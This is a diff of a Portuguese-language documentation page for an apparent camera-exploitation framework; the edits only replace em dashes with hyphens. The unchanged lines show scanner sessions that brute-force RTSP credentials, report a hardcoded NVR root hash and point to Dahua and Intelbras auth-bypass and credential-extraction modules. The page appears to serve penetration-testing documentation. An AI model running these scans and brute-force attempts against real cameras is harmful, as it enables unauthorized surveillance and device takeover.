@@ -1,6 +1,6 @@
 # Engine RTSP e Exploração de Câmeras
 
-**Idioma:** Português (pt-BR). **English:** — *(página exclusiva pt-BR)*
+**Idioma:** Português (pt-BR). **English:**  -  *(página exclusiva pt-BR)*
 
 ---
 
@@ -29,7 +29,7 @@ embedxpl/core/
 
 ## Scanners de câmera
 
-### `camera_scan` — descoberta geral de câmeras
+### `camera_scan`  -  descoberta geral de câmeras
 
 ```text
 exf > use scanners/cameras/camera_scan
@@ -61,7 +61,7 @@ exf (Camera Scan) > run
 
 ---
 
-### `rtsp_discover` — descoberta de streams RTSP
+### `rtsp_discover`  -  descoberta de streams RTSP
 
 ```text
 exf > use scanners/cameras/rtsp_discover
@@ -81,7 +81,7 @@ exf (RTSP Discover) > run
 
 ---
 
-### `rtsp_scanner` — scanner RTSP com brute-force de credenciais
+### `rtsp_scanner`  -  scanner RTSP com brute-force de credenciais
 
 ```text
 exf > use scanners/cameras/rtsp_scanner
@@ -95,7 +95,7 @@ exf (RTSP Scanner) > run
 [*] Trying admin:admin on rtsp://192.168.1.50:554/h264/ch1/main/av_stream...
 [-] FAIL: admin:admin (401)
 [*] Trying admin:12345 on rtsp://192.168.1.50:554/h264/ch1/main/av_stream...
-[+] SUCCESS: admin:12345 — RTSP stream accessible
+[+] SUCCESS: admin:12345  -  RTSP stream accessible
 [+] Stream: rtsp://admin:12345@192.168.1.50:554/h264/ch1/main/av_stream
 ```
 
@@ -130,7 +130,7 @@ exf (Camera Scan) > run
 
 ---
 
-### Herospeed/Longsee — scanner específico
+### Herospeed/Longsee  -  scanner específico
 
 ```text
 exf > use scanners/cameras/herospeed_longsee_nvr_scan
@@ -144,9 +144,9 @@ exf (Herospeed/Longsee NVR Scanner) > run
 [*] Checking firmware version...
 [+] Firmware: v2.0.6 (MC6830 platform)
 [*] Checking HSLS-2026-001 (unauthenticated account enum)...
-[+] HSLS-2026-001 vulnerable — accounts: admin, operator
+[+] HSLS-2026-001 vulnerable  -  accounts: admin, operator
 [*] Checking HSLS-2026-004 (hardcoded root hash)...
-[+] HSLS-2026-004 vulnerable — root hash: 12ZpTwfyH6/Bs
+[+] HSLS-2026-004 vulnerable  -  root hash: 12ZpTwfyH6/Bs
 [+] NVR is VULNERABLE to 4 advisories
     use exploits/cameras/herospeed/herospeed_nvr_unauth_account_enum
     use exploits/cameras/herospeed/herospeed_nvr_hardcoded_root_hash
@@ -156,7 +156,7 @@ exf (Herospeed/Longsee NVR Scanner) > run
 
 ---
 
-## Intelbras — câmeras OEM Dahua
+## Intelbras  -  câmeras OEM Dahua
 
 As câmeras Intelbras usam firmware derivado da Dahua e são vulneráveis às mesmas CVEs:
 
@@ -167,7 +167,7 @@ exf (Intelbras CCTV Discover) > set target 192.168.1.0/24
 exf (Intelbras_cctv_discover) > run
 [*] Running module ...
 [*] Scanning for Intelbras cameras...
-[+] 192.168.1.70 — Intelbras VIP 1120 D G2 (OEM Dahua, firmware 2.622.0000)
+[+] 192.168.1.70  -  Intelbras VIP 1120 D G2 (OEM Dahua, firmware 2.622.0000)
     Vulnerabilities: CVE-2021-33044, CVE-2021-36260 (Dahua variants)
     Suggested modules:
     use exploits/cameras/intelbras/cctv_dahua_auth_bypass
@@ -209,7 +209,7 @@ exf (RTSP Cameradar Attack) > run
 
 ---
 
-## Dahua — varredura de câmeras via protocolo proprietário
+## Dahua  -  varredura de câmeras via protocolo proprietário
 
 ```text
 exf > use scanners/cameras/dahua/p2p_pppp_scan
@@ -218,7 +218,7 @@ exf (Dahua P2P PPPP Scanner) > set target 192.168.1.0/24
 exf (Dahua P2P PPPP Scanner) > run
 [*] Running module ...
 [*] Scanning for Dahua P2P cameras (port 37777)...
-[+] 192.168.1.51 — Dahua (37777 open)
+[+] 192.168.1.51  -  Dahua (37777 open)
     P2P UID: 2L1A234KAZ00000 (extractable without authentication)
 [*] Use exploits/cameras/reolink/reolink_nvr_p2p_uid_extract_cve_2022_30600 for similar
     Use exploits/cameras/dahua/cctv_37777_credential_extraction for direct exploitation
